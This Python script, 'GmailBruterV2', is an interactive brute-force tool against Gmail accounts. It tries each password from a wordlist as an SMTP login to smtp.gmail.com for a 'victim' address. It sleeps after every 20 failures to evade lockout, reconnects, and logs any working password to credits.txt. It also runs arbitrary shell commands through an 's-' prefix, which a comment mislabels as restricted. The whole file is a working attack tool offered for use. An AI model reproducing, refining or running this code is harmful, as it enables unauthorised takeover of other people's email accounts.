import smtplib, os, sys, time

# ANSI Color Codes for Windows and Linux Support
if os.name == 'nt':
    os.system('color')

C_WHITE = "\033[97m"
C_GREEN = "\033[92m"
C_RED = "\033[91m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"

def Banner():
    banner_text = f"""
{C_CYAN}{C_BOLD}    
    ██████╗ ███╗   ███╗ █████╗ ██╗██╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ 
    ██╔════╝ ████╗ ████║██╔══██╗██║██║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
    ██║  ███╗██╔████╔██║███████║██║██║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
    ██║   ██║██║╚██╔╝██║██╔══██║██║██║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
    ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
     ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                      {C_WHITE}Version: 2.0 | By: @mdaif1332{C_RESET}
    """
    print(banner_text)

def StartBruteAccount(passlist, account, smtp_server, delay_time):
    count = 0
    total_count = 0
    
    try:
        with open(passlist, 'r', encoding='utf-8', errors='ignore') as f:
            for password in f:
                password = password.strip()
                if not password: continue
                
                try:
                    smtp_server.login(account, password)
                    print(f"\n{C_GREEN}[+] Valid Password Found: {C_BOLD}{password}{C_RESET} for {C_BOLD}{account}{C_RESET}")
                    
                    with open('credits.txt', 'a') as df:
                        df.write(f"\n[{time.ctime()}] Email: {account} | Password: {password}")
                    return True
                
                except smtplib.SMTPAuthenticationError:
                    count += 1
                    total_count += 1
                    print(f"\r{C_RED}[-] Bad Password ({total_count}): {C_RESET}{password[:20]:<20}", end="", flush=True)
                    
                    if count >= 20:
                        print(f"\n{C_YELLOW}[!] Cooling down for {delay_time} seconds...{C_RESET}")
                        time.sleep(int(delay_time))
                        count = 0
                        smtp_server.quit()
                        smtp_server = StartSMTPService()
                
                except Exception as e:
                    if "please run connect() first" in str(e).lower():
                        print(f"\n{C_RED}[!] SMTP Disconnected. Service limit reached or connection lost.{C_RESET}")
                        return False
                    print(f"\n{C_RED}[!] Error: {str(e)}{C_RESET}")
    except FileNotFoundError:
        print(f"\n{C_RED}[!] Error: Passlist file '{passlist}' not found.{C_RESET}")
    return False

def StartSMTPService():
    try:
        smtp = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        smtp.ehlo()
        smtp.starttls()
        return smtp
    except Exception as e:
        print(f"{C_RED}[!] Failed to connect to SMTP server: {e}{C_RESET}")
        return None

def HelpGuide():
    print(f"\n{C_BOLD}{C_CYAN}Help Guide For GmailBruterV2{C_RESET}")
    print(f"{C_WHITE}----------------------------------------{C_RESET}")
    print(f"{C_BOLD}help{C_RESET}          - Show this message")
    print(f"{C_BOLD}set target{C_RESET}    - Set victim email address (e.g., example@gmail.com)")
    print(f"{C_BOLD}set time{C_RESET}      - Set cooling time (seconds) after 20 attempts")
    print(f"{C_BOLD}set list{C_RESET}      - Set path to password list file")
    print(f"{C_BOLD}show{C_RESET}          - Show current session configuration")
    print(f"{C_BOLD}load <path>{C_RESET}   - Load configuration from a file")
    print(f"{C_BOLD}start{C_RESET}         - Begin the brute force attack")
    print(f"{C_BOLD}clear{C_RESET}         - Clear the screen")
    print(f"{C_BOLD}exit{C_RESET}          - Exit the program\n")

def StartShell():
    account = ''
    delay_time = '60'  # Default value
    passlist = 'PassList.txt' # Default value
    
    while True:
        try:
            prompt = f"{C_CYAN}{C_BOLD}GmailBruter{C_RESET} > "
            shell_response = input(prompt).strip()
            if not shell_response:
                continue

            cmd_parts = shell_response.lower().split()
            cmd = cmd_parts[0]

            if cmd == "help":
                HelpGuide()
            
            elif cmd == "set":
                if len(cmd_parts) < 3:
                    print(f"{C_RED}[!] Usage: set <target|time|list> <value>{C_RESET}")
                    continue
                
                key = cmd_parts[1]
                val = " ".join(cmd_parts[2:]) # Handle paths with spaces

                if key == "target":
                    account = val
                    print(f"{C_GREEN}[+] Target set to: {C_BOLD}{account}{C_RESET}")
                elif key == "time":
                    delay_time = val
                    print(f"{C_GREEN}[+] Cooling time set to: {C_BOLD}{delay_time}{C_RESET}s")
                elif key == "list":
                    passlist = val
                    print(f"{C_GREEN}[+] Passlist set to: {C_BOLD}{passlist}{C_RESET}")
                else:
                    print(f"{C_RED}[!] Unknown setting: {key}{C_RESET}")

            elif cmd == "show":
                print(f"\n{C_BOLD}{C_CYAN}Session Configuration:{C_RESET}")
                print(f"Target Email : {C_YELLOW}{account if account else 'Not Set'}{C_RESET}")
                print(f"Cooling Time : {C_YELLOW}{delay_time} seconds{C_RESET}")
                print(f"Password List: {C_YELLOW}{passlist}{C_RESET}\n")

            elif cmd == "start":
                if not account:
                    print(f"{C_RED}[!] Error: Target email not set. Use 'set target <email>'{C_RESET}")
                    continue
                if not os.path.exists(passlist):
                    print(f"{C_RED}[!] Error: Passlist file '{passlist}' does not exist.{C_RESET}")
                    continue
                
                print(f"{C_CYAN}[*] Initializing SMTP connection...{C_RESET}")
                service = StartSMTPService()
                if service:
                    print(f"{C_GREEN}[+] Connected! Starting attack...{C_RESET}")
                    StartBruteAccount(passlist, account, service, delay_time)
                    service.quit()
                else:
                    print(f"{C_RED}[!] Could not start attack without SMTP connection.{C_RESET}")

            elif cmd == "load":
                config_path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else input("Path: ")
                if os.path.exists(config_path):
                    with open(config_path, 'r') as f:
                        for line in f:
                            line = line.strip()
                            if not line or ':' not in line: continue
                            key, val = line.split(':', 1)
                            key = key.strip().lower()
                            val = val.strip()
                            if key == "email" or key == "target":
                                account = val
                                print(f"{C_GREEN}[+] Target Loaded: {val}{C_RESET}")
                            elif key == "list":
                                passlist = val
                                print(f"{C_GREEN}[+] List Loaded: {val}{C_RESET}")
                            elif key == "time":
                                delay_time = val
                                print(f"{C_GREEN}[+] Time Loaded: {val}{C_RESET}")
                else:
                    print(f"{C_RED}[!] Config file not found: {config_path}{C_RESET}")

            elif cmd == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                Banner()

            elif cmd == "exit":
                print(f"{C_YELLOW}Exiting... Goodbye!{C_RESET}")
                sys.exit(0)

            elif shell_response.startswith("s-"):
                # Restricted shell execution for convenience
                shell_cmd = shell_response[2:]
                print(f"{C_CYAN}[*] Executing system command: {shell_cmd}{C_RESET}")
                os.system(shell_cmd)
            
            else:
                print(f"{C_RED}[!] Unknown command: '{cmd}'. Type 'help' for available commands.{C_RESET}")

        except KeyboardInterrupt:
            print(f"\n{C_YELLOW}[!] Interrupted. Type 'exit' to quit.{C_RESET}")
        except EOFError:
            print(f"\n{C_YELLOW}[!] EOF received. Exiting...{C_RESET}")
            sys.exit(0)
        except Exception as e:
            print(f"{C_RED}[!] Critical Error in Shell: {e}{C_RESET}")

if __name__ == "__main__":
    Banner()
    StartShell()
